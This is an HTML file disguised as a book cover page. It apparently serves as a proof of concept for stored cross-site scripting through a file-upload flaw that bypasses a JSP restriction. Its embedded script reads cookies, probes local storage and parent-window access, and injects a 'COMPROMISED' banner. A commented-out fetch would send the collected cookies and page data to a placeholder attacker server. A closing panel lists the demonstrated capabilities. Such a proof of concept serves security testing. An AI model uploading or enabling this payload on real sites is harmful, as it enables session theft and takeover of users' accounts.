<!DOCTYPE html>
<html>
<head>
    <title>Innocent Book Cover</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .book-cover { text-align: center; padding: 20px; border: 2px solid #ccc; }
    </style>
</head>
<body>
    <div class="book-cover">
        <h2>Book Cover: "Advanced Programming"</h2>
        <p>This appears to be a legitimate book cover image replacement...</p>
        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMzQ5OGRiIi8+CiAgPHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtc2l6ZT0iMjAiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjNlbSI+Qm9vayBDb3ZlcjwvdGV4dD4KPC9zdmc+" alt="Book Cover" />
        
        <p><em>Author: John Smith</em></p>
        <p><em>Publisher: TechBooks Inc.</em></p>
    </div>
    
    <!-- Malicious JavaScript hidden in what looks like a book cover page -->
    <script>
        // XSS Payload - Variant of Cross-Site Scripting
        console.log("Malicious script loaded from uploaded HTML file!");
        
        // Steal session information
        if (document.cookie) {
            console.log("Cookies found:", document.cookie);
        }
        
        // Attempt to access local storage
        try {
            const localStorage = window.localStorage;
            console.log("LocalStorage accessible:", !!localStorage);
        } catch (e) {
            console.log("LocalStorage access denied");
        }
        
        // Show proof of XSS execution
        setTimeout(function() {
            alert("XSS EXECUTED!\n\nThis HTML file was successfully uploaded and executed JavaScript!\n\nProof of Concept:\n- File upload bypassed JSP restriction\n- HTML file with malicious JS was accepted\n- Script is now running in the browser context\n- Could steal cookies, session tokens, or perform actions as the user");
        }, 1000);
        
        // Demonstrate data exfiltration capability
        function exfiltrateData() {
            const pageData = {
                url: window.location.href,
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                cookies: document.cookie,
                timestamp: new Date().toISOString()
            };
            
            console.log("Exfiltrated data:", pageData);
            
            // In a real attack, this would be sent to an attacker-controlled server
            // fetch('http://attacker-server.com/collect', {
            //     method: 'POST', 
            //     body: JSON.stringify(pageData)
            // });
        }
        
        // Attempt to modify page content
        setTimeout(function() {
            const body = document.body;
            if (body) {
                const maliciousDiv = document.createElement('div');
                maliciousDiv.innerHTML = `
                    <div style="position: fixed; top: 10px; right: 10px; background: red; color: white; 
                                padding: 10px; border-radius: 5px; z-index: 9999; font-family: Arial;">
                        COMPROMISED<br>
                        <small>XSS via HTML upload</small>
                    </div>
                `;
                body.appendChild(maliciousDiv);
            }
        }, 2000);
        
        // Try to access parent window (if loaded in iframe)
        try {
            if (window.parent && window.parent !== window) {
                console.log("Parent window accessible - could perform actions in parent context");
            }
        } catch (e) {
            console.log("Parent window access blocked");
        }
        
        // Execute data exfiltration
        exfiltrateData();
    </script>
    
    <!-- Hidden iframe for additional exploitation -->
    <iframe src="javascript:void(0)" style="display:none" onload="console.log('Hidden iframe loaded')"></iframe>
    
    <div style="margin-top: 30px; padding: 10px; background: #f0f0f0; border-radius: 5px; font-size: 12px;">
        <strong>Attack Demonstration:</strong>
        <ul>
            <li>HTML file successfully uploaded despite JSP upload failure</li>
            <li>JavaScript execution in browser context</li>
            <li>Access to cookies and session data</li>
            <li>Ability to modify page content</li>
            <li>Data exfiltration capabilities</li>
            <li>Persistent XSS threat (file remains on server)</li>
        </ul>
        <p><em>This demonstrates a successful XSS variant through file upload vulnerability.</em></p>
    </div>
</body>
</html>